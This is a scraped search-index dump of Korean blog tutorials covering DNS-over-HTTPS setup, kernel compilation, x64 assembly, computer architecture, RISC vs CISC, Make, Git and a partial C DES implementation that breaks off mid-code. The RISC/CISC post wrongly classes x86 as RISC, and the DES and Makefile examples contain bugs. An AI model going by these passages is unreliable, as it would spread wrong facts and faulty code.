인증서를 발급 받을 수 없다.\nsudo certbot --nginx -d [DNS 도메인] 발급받은 인증서가 만료되었다면 아래 명령어를 통해 갱신할 수 있다.\nsudo certbot renew --dry-run 이제 https://[DNS 도메인]/dns-query에서 DNS over HTTPS 요청을 처리할 수 있다.\n","permalink":"https://pol4bear.github.io/posts/how-to-setup-dns-over-https/","summary":"DNS over HTTPS 서버의 동작 방식 Nginx가 Client로부터 요청된 DNS-over-HTTPS 요청을 복호화한 DNS-over-HTTP 요청을 doh-server에 전송 doh-server는 1번의 DNS-over-HTTP 요청을 DNS 요청으로 변환해서 DNS 서버에 전송 DNS 서버는 2번의 DNS 요청을 받아들임 DNS 서버는 3번의 DNS 요청에 대한 응답을 doh-server에 전송 doh-server는 3번의 DNS 응답을 DNS-over-HTTP 응답으로 변환해서 Nginx에 전송 Nginx는 4번의 DNS-over-HTTP 응답을 암호화한 DNS-over-HTTPS 응답을 Client에 전송 DNS over HTTPS 서버 구성 DNS Server(DNSCrypt-proxy or bind9): DNS 요청 처리 및 응답 doh-server: DNS-over-HTTP 요청 처리 및 응답 Nginx: HTTPS 요청 처리 및 응답 DNS 서버 설치 및 설정하기 다른 DNS 서버를 경유하는 방법(DNSCrypt-proxy)","title":"DoH(DNS over HTTPS) 서버 설치하기"},{"content":"커널 컴파일에 필요한 패키지들 설치 apt upgrade apt install build-essential ncurses-dev libelf-dev bison flex libssl-dev linux-source 커널 컴파일하기 linux-source 패키지를 설치하면 생성되는 커널 소스 파일의 압축을 푼다.\ncd /usr/src/linux-source-[커널 버전] tar xjf linux-source-[커널 버전].tar.bz2 기존 커널 컴파일 설정 파일을 가져온다.\n# 설치 되어있는 커널 버전은 uname -a로 확인한다. cd linux-source-[커널 버전] cp /boot/config-[설치되어 있는 커널 버전] .config 리눅스 커널을 컴파일한 후 설치한다.\n# 코어 수는 nproc 명령어로 확인 make -j [코어 수] make modules_install make install # make-kpkg를 사용할 경우 make-kpkg --initrd --J [코어 수] kernel_image cd .. dpkg -i linux-image-[커널 버전]_[프로세서].deb 재부팅한 후 커널이 정상적으로 설치됐나 커널의 버전을 확인한다.\nreboot uname -a 컴파일 전\n컴파일 후\n커널 컴파일 설정 바꾸기 커널의 버전만 바꾸기 위해서라면 원래 있는 설정 파일을 가져와서 컴파일해도 된다.\n하지만, 커널 디버깅 등 일반적인 상황에서는 활성화 되어있지 않는 작업같이 어떠한 기능을 켜거나 끄고 싶으면 컴파일 설정을 바꿔야 한다.\n설정을 처음부터 끝까지 다 하기는 어렵기 때문에 커널 컴파일하기의 2번처럼 원래 있는 설정 파일을 복사해온 후 커널 컴파일 설정을 진행한다.\n기존 커널 설정 파일을 가져온다.\ncp /boot/config-[설치되어 있는 커널 버전] .config Menuconfig로 커널 컴파일 설정을 진행한다.\nmake menuconfig Menuconfig에 들어가면 아래와 같은 화면이 나오는데 1번에서 가져온 설정 파일을 불러온다.\n원하는 대로 설정을 변경한 후 해당 설정을 저장한다.\nMenuconfig를 종료한다.\n커널 컴파일하기의 3, 4번과 같이 커널을 컴파일하고 설치한다.\n","permalink":"https://pol4bear.github.io/posts/linux-kernel-compile-and-install/","summary":"커널 컴파일에 필요한 패키지들 설치 apt upgrade apt install build-essential ncurses-dev libelf-dev bison flex libssl-dev linux-source 커널 컴파일하기 linux-source 패키지를 설치하면 생성되는 커널 소스 파일의 압축을 푼다.\ncd /usr/src/linux-source-[커널 버전] tar xjf linux-source-[커널 버전].tar.bz2 기존 커널 컴파일 설정 파일을 가져온다.\n# 설치 되어있는 커널 버전은 uname -a로 확인한다. cd linux-source-[커널 버전] cp /boot/config-[설치되어 있는 커널 버전] .config 리눅스 커널을 컴파일한 후 설치한다.\n# 코어 수는 nproc 명령어로 확인 make -j [코어 수] make modules_install make install # make-kpkg를 사용할 경우 make-kpkg --initrd --J [코어 수] kernel_image cd .","title":"Linux 커널 컴파일 및 설치"},{"content":"프로그램이 생성 및 실행되는 과정 프로그래머가 C, C++ 등의 언어로 프로그래밍을 하면 해당 언어의 컴파일러가 어셈블리 코드로 프로그램 코드를 변환한다. 어셈블러는 컴파일러가 변환한 어셈블리 코드를 오브젝트 코드로 변환한다. 링커는 어셈블러가 생성한 오브젝트 코드를 실제로 기계가 실행 가능한 바이너리 파일로 변환한다. 로더는 링커가 생성한 실행 가능한 바이너리를 메모리에 로드한다. 출처: https://www.brainkart.com/article/Assembly-and-Linking_11818/\nAssembly는 프로그래밍 언어 중 하나로써 사람이 읽기 어려운 기계어와 비교해서 사람이 읽을 수 있게 만든 한단계 위의 언어다.\n기계어가 CPU가 사용하는 ISA에 따라 달라지는 것과 같이 어셈블리 또한 통일된 규격이 없다.\nx64 프로세서에서 사용되는 어셈블리에는 문법이 두 가지로 갈린다.\nAT\u0026amp;T 스타일과 Intel 스타일의 문법이 있는데 주소 표현 방식과 명령어 몇개에 대해서 차이가 있다.\n아래 명령어를 실행해 실행파일을 원하는 문법으로 디스어셈블해서 볼 수 있다.\nobjdump -M [intel | ATT] -d 실행파일 두가지 문법으로 같은 파일을 디스어셈블하면 두 문법의 다른점을 확인할 수 있다.\n레지스터를 참조할 때 intel 문법에서는 %를 붙이지 않는다. 두개의 인자값이 있을 때 intel 문법에서는 오른쪽 값을 왼쪽으로, ATT 문법에서는 왼쪽에서 오른쪽으로 값을 집어넣는다. 레지스터에 주소 값을 더할 때 intel 문법에서는 [레지스터+더할 주소], ATT 문법에서는 더할 주소(레지스터)로 표현한다. call, nop 등 몇가지 명령어의 이름이 다르다. Intel Assembly\nNASM 어셈블러 사용 AT\u0026amp;T(ATT) Assembly\ngcc에 포함된 GAS(GNU Assembler) 사용 레지스터 어셈블리에서 사용되는 기본 변수 이름이다. 다른 고급 언어들과 달리 CPU에 하드웨어적으로 구현되어 있다. 이름의 변경이 불가능하다. CPU 종류 별로 레지스터의 이름이 다르다. CPU 안에 여러 레지스터들이 있고 레지스터 별로 정해진 용도가 있다. 출처: https://www.anandtech.com/show/598/5\nx64 기준 각 레지스터들의 크기는 64비트(8바이트)다. 1 바이트나 4 바이트의 데이터가 들어가면 그 레지스터에서 일정 부분만 사용하게 되는데 그 일정 부분의 레지스터 이름이 따로 있다. RAX 기준 절반인 32비트는 EAX, EAX를 반으로 나눈 16비트를 AX, AX를 반으로 나눠 8비트를 AH와 AL이라고 부른다. RBX 레지스터를 기준으로 한다면 EBX(32 bit) 다음 BX(16 bit)와 각 8 bit 크기의 BH, BL로 나눠진다. RAX, RBX, RCX, RDX의 16 bit 크기인 AX, BX, CX, DX의 높은 주소의 8 bit는 AH, BH, CH, DH라고 이름이 붙여졌지만 다른 피연산자들과 사용할 수 없다. RSI 레지스터는 ESI(32 bit), SI(16 bit), SIL(8 bit)로 나눠진다. 하지만 RAX의 AH와 다르게 SIH라는 레지스터는 없다. R8 레지스터는 R8D(32 bit), R8W(16 bit), R8B(8 bit)로 나눠진다. R15까지도 마찬가지다. 참고 자료: x64 Architecture x64 어셈블리 명령어 더 자세한 정보는 x86 and amd64 instruction reference에서 확인 가능하다.\nEflags 어셈블리 명령어에 eflag들의 값에 따라 실행되는 명령어들이 있다.\neflag들의 종류는 다음과 같다.\n출처: http://www.c-jump.com/CIS77/ASM/Instructions/lecture.html\nx64 어셈블리로 Hello World! 출력하기 리눅스에서 콘솔에 어떠한 값을 쓰려면 write syscall을 발생시켜야 하는데 syscall은 rax 레지스터 값에 따라서 호출되기 때문에 rax에 write syscall을 뜻하는 1을 집어넣는다.\nrdi에 출력할 위치를 정해주는데 표준 출력(stdout)인 1을 집어넣는다.\n출력할 문자열은 rsi에 넣어야 한다. message 심볼이 가리키는 문자열을 출력할 것이기 때문에 message 심볼에 있는 값을 rsi에 넣는다.\n각 syscall들을 사용하는 법은 여기에서 확인 가능하다. hello.asm 파일 작성\nglobal _start section .text _start: mov rax, 1 mov rdi, 1 mov rsi, message mov rdx, 14 syscall mov rax, 60 xor rdi, rdi syscall section .data message: db \u0026#34;Hello, World!\u0026#34;, 10 hello.asm을 어셈블해서 생성된 hello.o 파일을 링킹해 hello라는 실행 파일 생성\n# hello asm을 어셈블해 오브젝트 파일을 생성한다. nasm 어셈블러가 없다면 설치 nasm -felf64 hello.asm # 생성한 오브젝트 파일인 hello.o를 링킹 과정을 거쳐 실행파일 생성 ld -o hello hello.o hello 실행파일을 디스어셈블해서 어셈블 코드 보기\nobjdump -M intel -d hello ​\t어셈블리 코드를 작성했을 때는 rax와 rdi등 64 bit의 레지스터에 값을 집어넣었는데 eax와 rdi같은 32 bit 레지스터로 변경된 것을 확인할 수 있다. 이것은 어셈블 과정에서 작은 값을 집어넣는데 64 bit를 사용하는 것을 어셈블러가 확인하고 메모리 낭비가 없도록 최적화해 준 것이다. 어셈블리 코드 설명\n_start\n엔트리 포인트를 뜻하는 기본 심볼이다.\nC언어 main 함수와 비슷한 역할을 한다.\n엔트리 포인트의 심볼 이름을 바꾸고 싶다면 코드 상에서 심볼 이름을 바꾼 후 실행파일을 생성할때 다음 명령어를 사용하면 된다.\nld -e 심볼이름 -o 실행파일이름 오브젝트파일\nglobal\nGNU 링커(ld)가 읽어낼 수 있는 심볼 이름을 선언하는 지시자다. C언어에서 컴파일에게 변수/함수의 존재를 알리기 위해 선언하는 것처럼 링커에게 알리기 위해 심볼을 선언한다고 생각하면 된다.\nglobal 외에 다른 지시자들에 대한 정보는 여기에서 확인할 수 있다.\nsection\n어셈블리어는 실행 가능한 코드, 읽기 전용 데이터 등 종류에 나눠서 섹션으로 관리한다. 사용자가 정의하는 섹션과 미리 정의되어 있는 섹션으로 나뉘는데 아래 표는 사용자가 정의하는 섹션들이다.\n그 외 섹션들의 정보는 여기에서 확인할 수 있다. 데이터를 포함하고 있는 심볼을 생성하는 법\n읽기 쓰기가 모두 가능한 심볼은 .data 섹션에 정의한다. 읽기 전용 데이터 등 다른 타입의 데이터를 정의하고 싶다면 섹션 테이블 참조 가장 앞에는 데이터를 뜻하는 심볼을 설정한다. 심볼은 해당 데이터의 주소를 가리키고 있는데 변수 이름처럼 사용 가능하다. 심볼 뒤에는 사용할 데이터의 사이즈 단위를 설정한다. 데이터 사이즈가 db면 데이터는 1바이트 단위로 저장되지만, dw라면 2바이트 단위로 저장하기 때문에 dw 사이즈 심볼에 한 바이트를 집어넣는다고 해도 뒤에 한 바이트가 더 잡힌다.\n아래 테이블에 대한 정보는 여기와 여기에서 확인 가능하다. 그 뒤에는 값을 집어 넣는데 데이터와 데이터를 이을려면 콤마(,)로 구분해서 작성한다. 문자열이 아닌 숫자를 집어넣으면 그 숫자를 아스키 코드로 인식한다. 10은 아스키코드로 newline이다. # 심볼: 데이터사이즈 데이터값 message: db \u0026#34;Hello, World!\u0026#34;, 10 ","permalink":"https://pol4bear.github.io/posts/x64-assembly/","summary":"프로그램이 생성 및 실행되는 과정 프로그래머가 C, C++ 등의 언어로 프로그래밍을 하면 해당 언어의 컴파일러가 어셈블리 코드로 프로그램 코드를 변환한다. 어셈블러는 컴파일러가 변환한 어셈블리 코드를 오브젝트 코드로 변환한다. 링커는 어셈블러가 생성한 오브젝트 코드를 실제로 기계가 실행 가능한 바이너리 파일로 변환한다. 로더는 링커가 생성한 실행 가능한 바이너리를 메모리에 로드한다. 출처: https://www.brainkart.com/article/Assembly-and-Linking_11818/\nAssembly는 프로그래밍 언어 중 하나로써 사람이 읽기 어려운 기계어와 비교해서 사람이 읽을 수 있게 만든 한단계 위의 언어다.\n기계어가 CPU가 사용하는 ISA에 따라 달라지는 것과 같이 어셈블리 또한 통일된 규격이 없다.","title":"x64 Assembly 시작하기"},{"content":" 19세기 말에서 20세기 초까지의 컴퓨터는 지금과 같이 소프트웨어를 돌릴 수 있는 것이 아니라 단순한 계산만 할 수 있는 계산기였다. 단순한 계산만 할 수 있는 상태에서만 돌아가던 컴퓨터가 Finite-state machine(유한 상태 기계)이라는 개념이 등장하면서 여러가지 구조의 컴퓨터가 등장하면서 지금과 같이 소프트웨어를 실행할 수 있는 컴퓨터가 되었다. Turing machine(튜링 기계) 앨런 튜링이 1936년 On Computable Numbers, with an Application to the Entscheidungsproblem 논문에서 지금의 컴퓨터의 시조격인 튜링 기계라는 개념을 소개했다. 현재의 컴퓨터와 같이 현재 상태를 저장하고 실행할 명령어들을 기록하고 읽어오는 등의 작업을 할 수 있다. 튜링 기계 개념이 생겨나고 현재의 프로그래밍이라는 개념이 만들어졌다. 튜링 기계가 개념이 없었다면 페이스북용 컴퓨터, 트위터용 컴퓨터, 네이버용 컴퓨터 등 기능별로 컴퓨터를 따로 만들어야 했을 것이다. Von Neumann Architecture(폰 노이만 구조) 폰 노이만 구조는 1945년 폰 노이만이 First Draft of a Report on EDVAC에 설명한 컴퓨터 구조다. 폰 노이만 구조의 구성요소 Processing unit - 산술 논리 장치(ALU)와 프로세서 레지스터들을 포함한다. Control unit - 명령어 레지스터와 프로그램 카운터를 포함한다. Memory - 데이터와 명령어들을 저장한다. 외부 대용량 저장 장치 입출력 메커니즘 데이터와 명령어가 동일한 메모리와 버스를 사용하기 때문에 병목 현상이 생길 수 있다. Havard Architecture(하버드 구조) 명령어와 데이터를 엄격하게 분리해 별도의 메모리에 나눠 저장하여 폰 노이만 방식과 달리 프로그램 실행과 데이터에 접근을 동시에 할 수 있다. 명령어의 처리가 끝나자마자 다음 명령어를 읽어들일 수 있기 때문에 속도가 더 빠르다. 하버드 구조의 구성요소 Control unit 산술 논리 장치(ALU) 명령어 메모리 데이터 메모리 외부 대용량 저장 장치 입출력 메커니즘 Modified Harvard Architecture(수정된 하버드 구조) 현재의 컴퓨터는 폰 노이만 구조와 하버드 구조를 합쳐놓은 형태다. 메모리와 CPU의 속도 차이를 해소시키기 위해서 고속의 캐시 메모리를 사용한다. 캐시 메모리는 데이터와 명령어 캐시 메모리로 나눠진다. 명령어와 데이터를 엄격하게 구분하지만 하버드 구조와 달리 물리적으로 구분되지는 않는다. ","permalink":"https://pol4bear.github.io/posts/computer-architecture/","summary":"19세기 말에서 20세기 초까지의 컴퓨터는 지금과 같이 소프트웨어를 돌릴 수 있는 것이 아니라 단순한 계산만 할 수 있는 계산기였다. 단순한 계산만 할 수 있는 상태에서만 돌아가던 컴퓨터가 Finite-state machine(유한 상태 기계)이라는 개념이 등장하면서 여러가지 구조의 컴퓨터가 등장하면서 지금과 같이 소프트웨어를 실행할 수 있는 컴퓨터가 되었다. Turing machine(튜링 기계) 앨런 튜링이 1936년 On Computable Numbers, with an Application to the Entscheidungsproblem 논문에서 지금의 컴퓨터의 시조격인 튜링 기계라는 개념을 소개했다. 현재의 컴퓨터와 같이 현재 상태를 저장하고 실행할 명령어들을 기록하고 읽어오는 등의 작업을 할 수 있다.","title":"컴퓨터 구조"},{"content":"프로세서의 종류 임베디드에 쓰이는 프로세서와 우리가 흔히 접하는 PC의 x86, x86-64 프로세서까지 많은 종류의 프로세서가 있다. 여러가지 종류의 프로세서들이 있지만 기계어 명령어의 집합인 명령어 집합 구조(Instruction set architecture, ISA)에 따라 프로세스의 종류를 구분할 수 있다. 명령어 집합 구조(ISA)의 종류 RISC(Reduced instruction set computer, 축소 명령어 집합 컴퓨터) 흔히 사용하는 컴퓨터는 RISC 방식을 사용한다. 고급 언어 명령어 하나를 실행하기 위해 여러 기계 명령어가 실행되어야 하는 구조 메모리 로드, 저장 작업과 연산 작업 등의 작업을 위해 여러 명령어를 사이클 방식으로 처리한다. CISC와 비교해 총 명령어의 개수가 100개 이내로 적은 편이다. 고정 길이의 명령어 방식으로 디코딩이 간단하다. 프로세서 내에 많은 레지스터들이 있다. 적은 명령어를 포함하고 있기 때문에 하드웨어의 설계가 비교적 단순하다. 하드웨어가 단순해진 만큼 소프트웨어는 복잡하고 크기가 커진다. 적은 수의 주소지정 방식을 가지고 있다. RISC 방식의 프로세서 SPARC Alpha PowerPC IA64/Itanium MIPS x86 CISC(Complex instruction set computer, 복잡한 명령어 집합 컴퓨터) 고급 언어 명령어 하나에 하나의 기계 명령어를 1:1로 매핑시킨 킨 구조 하나의 명령어로 메모리에서 로드, 저장 작업과 연산 작업 등 여러 로우-레벨 작업들을 실행할 수 있다. RISC와 비교해 명령어의 수가 많다. 많은 종류의 기계 명령어들 중 자주 쓰이지 않는 명령어들이 있다. 명령어들이 균일하게 사용되지 않는다. 가변 길이의 명령어 방식을 가지고 있다. 많은 명령어를 포함하고 있기 때문에 하드웨어 설계가 비교적 복잡하다. 하나의 기계 명령어로 많은 작업을 실행할 수 있기 때문에 CISC와 비교해 소프트웨어는 단순하고 크기가 작아진다. 다양한 주소지정 방식을 가지고 있다. ","permalink":"https://pol4bear.github.io/posts/what-is-instruction-set-architecture/","summary":"프로세서의 종류 임베디드에 쓰이는 프로세서와 우리가 흔히 접하는 PC의 x86, x86-64 프로세서까지 많은 종류의 프로세서가 있다. 여러가지 종류의 프로세서들이 있지만 기계어 명령어의 집합인 명령어 집합 구조(Instruction set architecture, ISA)에 따라 프로세스의 종류를 구분할 수 있다. 명령어 집합 구조(ISA)의 종류 RISC(Reduced instruction set computer, 축소 명령어 집합 컴퓨터) 흔히 사용하는 컴퓨터는 RISC 방식을 사용한다. 고급 언어 명령어 하나를 실행하기 위해 여러 기계 명령어가 실행되어야 하는 구조 메모리 로드, 저장 작업과 연산 작업 등의 작업을 위해 여러 명령어를 사이클 방식으로 처리한다.","title":"명령어 집합 구조란?"},{"content":"Make란 프로그램을 빌드할 때 사용되는 도구다. 원래는 여러 소스 코드들을 직접 명령어를 입력해서 각각 빌드해야하지만 make에는 그런 것들을 보조해주는 기능이 몇가지 있다. 수정된 소스 코드만 빌드해서 프로그램을 빌드하는 기능. 소스 코드의 크기가 작을 때는 못느껴도 대형 프로젝트에서는 빌드가 오래 걸리기 때문에 엄청난 메리트가 있다. 빌드할때 생겨난 파일중 필요 없는 파일을 삭제할 때 지시어로 간편하게 삭제가 가능하다. Makefile이라는 파일에서 지시어들을 참조해서 빌드한다. Makefile 문법 지시어 문법은 다음과 같다. Make 명령어에 타겟을 인자로 주면 타겟 아래 있는 명령어를 실행하여 빌드한다.\n타겟: 참조파일1 참조파일2 참조파일3 명령어 Makefile 작성 실습 간단한 프로그램을 작성해 Makefile 작성을 실습한다. 아래와 같이 파일들을 구성한뒤 make 명령어로 빌드할 수 있다. main.c #include \u0026lt;stdio.h\u0026gt; #include \u0026#34;sum.h\u0026#34; int main() { int n = 0; int s = 0; scanf(\u0026#34;%d\u0026#34; \u0026amp;n); s = sum(n); printf(\u0026#34;1부터 %d까지의 합: %d\u0026#34;, n, s); } sum.h #pragma once int sum(int n); sum.c int sum(int n) { int s = 0; for(int i = 1; i \u0026lt;= n; i++) s += i; return s; } Makefile all: sum sum: main.o sum.o gcc -o sum main.o sum.o main.o: sum.h main.c gcc -c -o main.o main.c sum.o: sum.c gcc -c -o sum.o sum.c clean: rm -f *.o rm -f sum ","permalink":"https://pol4bear.github.io/posts/how-to-use-make/","summary":"Make란 프로그램을 빌드할 때 사용되는 도구다. 원래는 여러 소스 코드들을 직접 명령어를 입력해서 각각 빌드해야하지만 make에는 그런 것들을 보조해주는 기능이 몇가지 있다. 수정된 소스 코드만 빌드해서 프로그램을 빌드하는 기능. 소스 코드의 크기가 작을 때는 못느껴도 대형 프로젝트에서는 빌드가 오래 걸리기 때문에 엄청난 메리트가 있다. 빌드할때 생겨난 파일중 필요 없는 파일을 삭제할 때 지시어로 간편하게 삭제가 가능하다. Makefile이라는 파일에서 지시어들을 참조해서 빌드한다. Makefile 문법 지시어 문법은 다음과 같다. Make 명령어에 타겟을 인자로 주면 타겟 아래 있는 명령어를 실행하여 빌드한다.","title":"Make로 프로그램 빌드하기"},{"content":"Git이란 개발 도중 변경 소스 코드의 변경 사항을 추적할 수 있는 분산 버전 관리 시스템이다. 다른 저장 관리 시스템인 SVN(Subversion)은 외부 서버에 저장소를 두고 있지만 Git은 평소에는 내부에 브랜치라는 저장소를 가지고 있다. 평소에는 브랜치에 변경 사항을 적용하고 여러 사람과 같이 저장소를 공유한다면 외부의 저장소에 push할 때 자신의 브랜치의 내용을 병합시키는 식이다. GitHub과 GitLab은 Git 저장소를 제공해주는 대표적인 서비스들이다. 위와 같은 서비스는 인터넷이 안되는 환경에서는 이용할 수 없기 때문에 직접 서버를 설정해야 한다. GitHub는 HTTPS와 SSH를 통한 저장소 연결을 지원한다. Git 저장소 생성하기 GitHub에 로그인한 후 왼쪽 메뉴에 나오는 New 버튼을 클릭한다.\n저장소 이름과 공개 여부를 설정한 후 새 저장소를 생성한다.\nPublic: 모두에게 공개, 변경할 사람 선택 Private: 공개할 사람 / 변경할 사람 선택 생성한 저장소의 주소를 복사한다.\nGit 저장소 사용하기 패키지 매니저로 git을 설치한다.\nGitHub에 있는 저장소를 내부에 있는 master라는 브랜치에 가져온다.\n가져온 hello-world 저장소에 C언어로 hello world!를 콘솔에 출력해주는 main.c를 작성한다.\n브랜치의 상태와 비교해서 생성/변경/삭제 등 변경 사항을 확인한다.\ncommit할 파일들을 staging area에 등록한다.\n처음 에는 commit할 때 이메일을 찾을 수 없다면서 commit이 안된다. 안내되는 명령어로 이메일을 등록한 후 다시 commit한다. commit 완료 내역은 git log 명령어로 확인할 수 있다.\n브랜치에 저장된 적용된 상태를 외부 서버에 적용시킨다.\nmain.c를 변경하고 현재 상태를 확인해보면 브랜치의 상태와 비교해서 main.c가 변경된 것을 확인할 수 있다. 변경 사항을 적용하려면 5번부터 7번까지의 과정을 반복하면 된다.\n여러 사람과 같이 작업할 때 여러 사람과 함께 작업하면 외부 서버에 적용된 상태와 브랜치에 저장된 상태가 달라지는 상황이 많은데 git pull 명령어로 외부 서버에 적용된 상태를 브랜치에 적용할 수 있다.\n","permalink":"https://pol4bear.github.io/posts/how-to-use-git/","summary":"Git이란 개발 도중 변경 소스 코드의 변경 사항을 추적할 수 있는 분산 버전 관리 시스템이다. 다른 저장 관리 시스템인 SVN(Subversion)은 외부 서버에 저장소를 두고 있지만 Git은 평소에는 내부에 브랜치라는 저장소를 가지고 있다. 평소에는 브랜치에 변경 사항을 적용하고 여러 사람과 같이 저장소를 공유한다면 외부의 저장소에 push할 때 자신의 브랜치의 내용을 병합시키는 식이다. GitHub과 GitLab은 Git 저장소를 제공해주는 대표적인 서비스들이다. 위와 같은 서비스는 인터넷이 안되는 환경에서는 이용할 수 없기 때문에 직접 서버를 설정해야 한다.","title":"Git으로 버전 관리 시작하기"},{"content":"DES란? DES(Data Encryption Standard, 데이터 암호화 표준)란?\nC언어로 DES 구현하기 전체 소스 des.h #pragma once //unsinged byte로 사용하기 위해 타입 선언 typedef unsigned char UBYTE; // 복호화 함수 // c: 암호문 k: 키 p: 평문 void DES_dec(UBYTE c[8], UBYTE k[7], UBYTE p[8]); // 암호화 함수 // p: 평문 k: 키 c: 암호문 void DES_enc(UBYTE p[8], UBYTE k[7], UBYTE c[8]); // 라운드 키 생성 함수 // k: 키 sk: 라운드 키 void key_gen(UBYTE k[7], UBYTE sk[16][6]); // end of DES.h keygen.c #include \u0026#34;des.h\u0026#34; // 라운드 키 생성 시 좌측 시프트 연산때 참조하는 배열 UBYTE v[16] = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 }; // 선택 치환 출력 값을 보관할 배열 UBYTE out[8]; // 라운드 키를 생성과정 중 선택 치환 PC1을 구현한 함수 void pc1(UBYTE k[7]) { out[0] |= ((k[7] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[0] |= ((k[6] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[0] |= ((k[5] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[0] |= ((k[4] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[0] |= ((k[3] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 3; out[0] |= ((k[2] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 2; out[0] |= ((k[1] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 1; out[0] |= ((k[0] \u0026gt;\u0026gt; 7) \u0026amp; 1); out[1] |= ((k[7] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[1] |= ((k[6] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[1] |= ((k[5] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[1] |= ((k[4] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[1] |= ((k[3] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 3; out[1] |= ((k[2] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 2; out[1] |= ((k[1] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 1; out[1] |= ((k[0] \u0026gt;\u0026gt; 6) \u0026amp; 1); out[2] |= ((k[7] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[2] |= ((k[6] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[2] |= ((k[5] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[2] |= ((k[4] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[2] |= ((k[3] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 3; out[2] |= ((k[2] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 2; out[2] |= ((k[1] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 1; out[2] |= ((k[0] \u0026gt;\u0026gt; 5) \u0026amp; 1); out[3] |= ((k[7] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[3] |= ((k[6] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[3] |= ((k[5] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[3] |= ((k[4] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[4] |= ((k[7] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[4] |= ((k[6] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[4] |= ((k[5] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[4] |= ((k[4] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[4] |= ((k[3] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 3; out[4] |= ((k[2] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 2; out[4] |= ((k[1] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 1; out[4] |= ((k[0] \u0026gt;\u0026gt; 1) \u0026amp; 1); out[5] |= ((k[7] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[5] |= ((k[6] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[5] |= ((k[5] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[5] |= ((k[4] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[5] |= ((k[3] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 3; out[5] |= ((k[2] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 2; out[5] |= ((k[1] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 1; out[5] |= ((k[0] \u0026gt;\u0026gt; 2) \u0026amp; 1); out[6] |= ((k[7] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[6] |= ((k[6] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[6] |= ((k[5] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[6] |= ((k[4] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 4; out[6] |= ((k[3] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 3; out[6] |= ((k[2] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 2; out[6] |= ((k[1] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 1; out[6] |= ((k[0] \u0026gt;\u0026gt; 3) \u0026amp; 1); out[7] |= ((k[3] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 7; out[7] |= ((k[2] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 6; out[7] |= ((k[1] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 5; out[7] |= ((k[0] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 4; } // DES 키를 입력받아 라운드키를 생성하는 함수 // sk로 라운드 키 반환 void key_gen(UBYTE k[7], UBYTE sk[16][6]) { UBYTE L[4], R[4], temp1[4], temp2[4]; int i, j; pc1(k); for (i = 0; i \u0026lt; 4; i++) { L[i] = out[i]; R[i] = out[4 + i]; } for (i = 0; i \u0026lt; 16; i++) { for (j = 0; j \u0026lt; 